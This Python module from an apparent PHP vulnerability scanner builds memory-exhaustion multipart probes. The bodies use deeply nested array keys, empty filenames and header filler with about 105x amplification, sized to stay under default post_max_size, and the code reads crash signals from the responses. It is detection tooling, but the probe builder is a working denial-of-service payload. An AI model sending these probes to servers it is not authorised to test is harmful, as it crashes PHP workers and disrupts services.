"""
Probe construction and crash-signal analysis.

This is the accuracy-critical part of the scanner. Everything here is derived
from the published research:

  - Calif's writeup (calif.io/php2shell) for the OOM primitives
  - GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp for the SAPI differences
  - Assetnote/Searchlight's high-fidelity detection mechanism for the
    progressive probe strategy and the differential-500 signal

THE DETECTION PROBLEM
---------------------
We cannot read the target's PHP version reliably (expose_php is often off, and
distro backports make version strings lie in both directions). So we detect
BEHAVIOURALLY: send a multipart body engineered to exhaust memory_limit during
request parsing, and observe how the target fails.

Three failure modes are diagnostic:

  1. IN-BAND FATAL
     The response body contains PHP's memory-exhaustion error naming
     "Unknown on line 0". That location means PHP failed during request
     INITIALIZATION, before any script ran. This is the exploit's fingerprint
     and it is the strongest single signal.

  2. DIFFERENTIAL EMPTY 500
     A control request produced output, but the probe returns HTTP 500 with an
     EMPTY body. The worker died mid-request. On PHP-FPM this is the classic
     worker-failure signature. The control comparison is what makes this
     reliable: a target that always returns empty 500s is not a signal.

  3. FRONTEND 502/503/504
     The web server in front of PHP-FPM reports the upstream died. Only
     meaningful when the control request succeeded.

WHAT IS NOT A SIGNAL
--------------------
  - A 500 with a non-empty body and no PHP fatal signature (app error)
  - Any of 400/403/411/413/414/417/422/429/431 (rejected before PHP parsed it)
  - A 5xx on the control request itself (target is broken, not vulnerable)
  - A crash on a target whose control request already failed

THE FALSE-POSITIVE WE MUST AVOID
--------------------------------
A PATCHED PHP can still OOM on a large multipart body and return an empty 500.
The patch does not stop memory exhaustion; it stops the exhaustion from
leaving exploitable state. So an empty 500 alone is NOT proof of vulnerability
on a patched host with a low memory_limit.

We handle this by:
  - escalating probe size progressively (1 MiB -> 8 MiB -> 20 MiB), so we only
    reach the large probes when smaller ones produced nothing
  - treating the in-band "Unknown on line 0" fatal as the primary signal
  - falling back to version data, clearly labelled as lower confidence
  - reporting confidence explicitly rather than a bare boolean
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import Optional

from .transport import Response

# ---------------------------------------------------------------------------
# Probe parameters
# ---------------------------------------------------------------------------

# Nesting depth for the array key. Calif's writeup: a nested field name like
# files[a][b][c]... forces PHP to build the hierarchy separately for each of
# the six $_FILES entries, multiplying native allocations per wire byte.
# 62 levels is what the reference scanner uses.
NESTED_KEYS = 62

# Progressive probe ladder: (size in MiB, number of parts).
# Start small so a low memory_limit target is caught without sending 20 MiB.
# Escalate only when the previous probe produced no signal.
#
# WHY THE LADDER IS SHAPED THIS WAY (measured, not guessed)
# --------------------------------------------------------
# The memory cost of a probe is dominated by the header-filler lines, not by
# the part count. Measured against PHP 8.4.8 with the empty-boundary trick:
#
#     wire 16 KiB -> 4 MB peak      wire 1 MiB -> 106 MB peak
#     wire 64 KiB -> 8 MB peak      wire 2 MiB -> 210 MB peak
#     wire 256 KiB -> 28 MB peak    wire 4 MiB -> 418 MB peak
#
# That is a stable ~105x amplification: every wire byte costs ~105 bytes of
# PHP memory. So the ladder is really a memory ladder, and the wire size is
# just the knob.
#
# The old ladder topped out at 20 MiB, which is a guaranteed no-op on any host
# with the default post_max_size=8M: PHP discards the body before parsing it
# and the probe can never fire. Worse, the 8 MiB rung cleared the 8M limit by
# only 3 bytes. Both rungs are now kept under the common limits, and the
# escalation is expressed in terms of the memory it buys.
#
# 1 MiB  -> ~106 MB   catches memory_limit <= 128M (the PHP default)
# 4 MiB  -> ~418 MB   catches memory_limit <= 512M
# 7 MiB  -> ~730 MB   catches memory_limit <= 768M, still under post_max_size=8M
#
# Anything above 7 MiB needs post_max_size raised, which the scanner discovers
# at runtime (see discover_post_max_size) rather than assuming.
PROBE_LADDER: tuple[tuple[int, int], ...] = (
    (1, 4000),
    (4, 2000),
    (7, 1200),
)

# Measured memory amplification of the empty-boundary filler trick: PHP
# allocates ~105 bytes of native memory per wire byte of header filler.
MEMORY_AMPLIFICATION = 105

# Default post_max_size in php.ini-production. Bodies at or above this are
# discarded by PHP before the multipart parser runs, so they can never
# produce a signal. We treat it as the assumed ceiling until we learn better.
DEFAULT_POST_MAX_SIZE = 8 << 20

# The warning PHP emits when it discards an oversized body. It names the
# configured limit, which lets us discover post_max_size from the target.
POST_MAX_MARKER = b"POST Content-Length of "
POST_MAX_LIMIT_RE = re.compile(
    rb"exceeds the limit of (\d+) bytes"
)

# Statuses that mean "rejected before PHP parsed the body". A WAF, a proxy
# limit, or a web-server rule produced these. They are NOT crash signals.
REJECTED_STATUSES = frozenset({400, 403, 411, 413, 414, 417, 422, 429, 431})

# Frontend statuses indicating the upstream PHP worker died.
UPSTREAM_DEAD_STATUSES = frozenset({502, 503, 504})

# The exact strings PHP emits on memory exhaustion. Both forms appear in the
# wild: the first when memory_limit is finite, the second when it is -1 and
# the OS allocation fails instead.
OOM_MARKERS = (
    b"Allowed memory size of ",
    b"Out of memory (allocated ",
)

# "Unknown on line 0" is the discriminator between an initialization-time
# failure (exploitable path) and an ordinary application OOM (names a file).
INIT_LOCATION_MARKERS = (b"Unknown on line 0", b"in Unknown on line 0")

# PHP renders fatal errors as HTML when html_errors=On, which is the DEFAULT
# whenever display_errors is on. The rendered form looks like:
#
#   <br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 bytes
#   exhausted (tried to allocate 4096 bytes) in <b>Unknown</b> on line <b>0</b>
#
# The tags break every literal marker match, so we MUST normalize before
# checking. Missing this produces false negatives on most real targets.
_TAG_RE = re.compile(rb"<[^>]{0,200}>")
_WS_RE = re.compile(rb"[ \t\r\n]+")


def normalize_body(body: bytes) -> bytes:
    """
    Strip HTML tags and collapse whitespace so marker matching works on both
    the plain-text and the html_errors-rendered form of a PHP fatal.

    Also decodes the handful of HTML entities PHP emits in error output.
    """
    if not body:
        return b""
    # Only bother if it looks like markup; avoids touching binary bodies.
    if b"<" in body:
        body = _TAG_RE.sub(b" ", body)
        body = (body.replace(b"&quot;", b'"')
                    .replace(b"&#039;", b"'")
                    .replace(b"&apos;", b"'")
                    .replace(b"&lt;", b"<")
                    .replace(b"&gt;", b">")
                    .replace(b"&amp;", b"&"))
    return _WS_RE.sub(b" ", body).strip()


class Verdict(str, Enum):
    """Scanner verdict for one target."""

    VULNERABLE = "VULNERABLE"        # behavioural proof
    LIKELY_VULNERABLE = "LIKELY"     # version says unpatched, no crash observed
    FIXED = "FIXED"                  # version says patched, no crash observed
    NOT_VULNERABLE = "NOT_VULNERABLE"  # no signal, no version data
    INCONCLUSIVE = "INCONCLUSIVE"    # target blocked/broken us
    ERROR = "ERROR"                  # could not complete the scan


class Confidence(str, Enum):
    """How much weight to put on a verdict."""

    HIGH = "HIGH"        # behavioural proof (crash signal observed)
    MEDIUM = "MEDIUM"    # version data only, or partial behavioural evidence
    LOW = "LOW"          # weak/ambiguous signal
    NONE = "NONE"        # no evidence either way


class Signal(str, Enum):
    """The specific crash signal observed, if any."""

    IN_BAND_FATAL = "in-band PHP fatal (memory exhausted in Unknown)"
    EMPTY_500 = "differential empty HTTP 500 (worker died mid-request)"
    UPSTREAM_DEAD = "frontend 502/503/504 (upstream worker died)"
    EMPTY_200 = "HTTP 200 with empty body after control produced output"
    BODY_DISCARDED = "body discarded by post_max_size (probe never parsed)"
    NONE = "none"


@dataclass
class ProbeResult:
    """One probe attempt and what it told us."""

    index: int
    size_mib: int
    parts: int
    response: Response
    signal: Optional[Signal] = None
    detail: str = ""


# ---------------------------------------------------------------------------
# Body construction
# ---------------------------------------------------------------------------

def build_probe_body(size_mib: int, parts: int, nested: int = NESTED_KEYS) -> bytes:
    """
    Build a multipart body engineered to exhaust memory_limit during parsing.

    Structure:
      - A boundary line.
      - A run of header-like filler lines ("x:\\n") to pad the body to the
        requested size cheaply. These are parsed as part headers, which is
        itself memory-expensive relative to their wire size.
      - `parts` copies of a file part whose field name is a deeply nested
        array key and whose filename is empty.

    Why the empty filename matters (Calif):
      An RFC1867 part with filename="" carries no file data and is NOT counted
      toward max_file_uploads, but PHP still creates all six $_FILES entries
      (name, full_path, type, tmp_name, error, size). With a nested field name,
      that hierarchy is built separately for each of the six entries. One short
      record expands into many native HashTables, Buckets and string keys.

    Why the nested key matters:
      It routes the insertion through _zend_hash_str_add_or_update_i(), the
      function that increments the hash-table counters before allocating the
      key -- the ordering bug at the heart of CVE-2026-109618.
    """
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * nested)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts

    if size < len(base):
        raise ValueError(
            f"probe of {size} bytes cannot hold {parts} parts ({len(base)} bytes)"
        )

    # Pad with header lines. Each "x:\n" is 3 bytes on the wire but costs a
    # header entry in PHP's parser.
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def build_control_body() -> bytes:
    """
    A minimal, harmless multipart request.

    Its only job is to establish a baseline: does this target produce output
    for a normal multipart POST? Without that baseline, an empty 500 from the
    probe is meaningless -- the target might always return empty 500s.
    """
    return b"--x\nContent-Disposition:name=a;filename=\n\n"


CONTROL_BOUNDARY = "x"
PROBE_BOUNDARY = ""


def build_oversize_body(size: int) -> bytes:
    """
    A body of `size` bytes, used only to discover post_max_size.

    It is deliberately NOT a valid probe: we want PHP to reject it and tell us
    the limit, not to parse it. The empty-boundary multipart shape is reused so
    that a host which *does* accept it still exercises the vulnerable path.
    """
    filler = b"x:\n" * max(1, size // 3)
    return b"--\n" + filler


def parse_post_max_size(body: bytes) -> Optional[int]:
    """
    Extract post_max_size from PHP's "exceeds the limit" warning.

    PHP emits this during request startup when the body is larger than
    post_max_size, and it names the configured limit in bytes. That turns a
    rejection into useful information: we learn the exact ceiling instead of
    guessing at it.

    Returns None when the warning is absent (limit not hit, or display_errors
    is off and the warning was suppressed).
    """
    if not body or POST_MAX_MARKER not in body:
        return None
    match = POST_MAX_LIMIT_RE.search(body)
    if match is None:
        return None
    try:
        return int(match.group(1))
    except ValueError:
        return None


def memory_cost(size_mib: int) -> int:
    """Approximate native memory a probe of this wire size will cost PHP."""
    return size_mib * (1 << 20) * MEMORY_AMPLIFICATION


# ---------------------------------------------------------------------------
# Signal analysis
# ---------------------------------------------------------------------------

def detect_signal(
    control: Response,
    probe: Response,
    sapi: str = "auto",
) -> tuple[Optional[Signal], str]:
    """
    Decide whether a probe response constitutes a crash signal.

    Returns (signal, human-readable detail). signal is None when the response
    is not diagnostic.

    The `control` response is essential: every differential check compares
    against it, so a target that is uniformly broken cannot produce a
    false positive.
    """
    # Normalize first: PHP renders fatals as HTML by default, and the tags
    # break literal marker matching.
    body = normalize_body(probe.body or b"")

    # --- 1. In-band PHP fatal naming an initialization-time location -------
    # This is the strongest signal: PHP told us it died while parsing the
    # request, before any application code ran.
    has_oom = any(marker in body for marker in OOM_MARKERS)
    has_init_loc = any(marker in body for marker in INIT_LOCATION_MARKERS)

    if has_oom and has_init_loc:
        return (
            Signal.IN_BAND_FATAL,
            "response contains a PHP memory-exhaustion fatal located in "
            "'Unknown on line 0', i.e. raised during request initialization "
            "before any script executed",
        )

    # An OOM that names a real file/line is an application-level error, not
    # the vulnerability. Report it as no signal, but note it.
    if has_oom and not has_init_loc:
        return (None, "memory exhaustion in application code (not a signal)")

    # --- 2. Differential empty 500 ----------------------------------------
    # The control produced output, the probe produced nothing, and the status
    # is 500. The worker died mid-request.
    if probe.status == 500 and control.body and not body:
        return (
            Signal.EMPTY_500,
            "HTTP 500 with an empty body, although the control request "
            "produced output -- the request handler died mid-request",
        )

    # --- 3. Frontend reports the upstream died ----------------------------
    # Only meaningful for FPM-fronted setups, and only when the control
    # request succeeded (otherwise the backend was already down).
    if sapi in ("auto", "fpm") and probe.status in UPSTREAM_DEAD_STATUSES:
        if control.ok and control.status and control.status < 500:
            return (
                Signal.UPSTREAM_DEAD,
                f"HTTP {probe.status} from the frontend while the control "
                f"request succeeded -- the PHP-FPM worker died mid-request",
            )

    # --- 4. Empty 200 after a control that produced output ----------------
    # Some FPM setups swallow the error and return an empty 200 when the
    # worker dies. Weaker than a 500, but still differential.
    if sapi in ("auto", "fpm") and probe.status == 200 and control.body and not body:
        return (
            Signal.EMPTY_200,
            "HTTP 200 with an empty body although the control request "
            "produced output -- consistent with a worker dying mid-request",
        )

    return (None, "")


def is_rejected(response: Response) -> bool:
    """True when the request was refused before PHP could parse the body."""
    return response.status in REJECTED_STATUSES


def describe_response(response: Response, limit: int = 200) -> str:
    """One-line summary of a response, for verbose output."""
    if response.error:
        return f"error: {response.error}"
    snippet = response.body_text(limit).replace("\n", " ").strip()
    if len(snippet) > limit:
        snippet = snippet[:limit] + "..."
    return f"HTTP {response.status} ({len(response.body)} bytes) {snippet!r}"
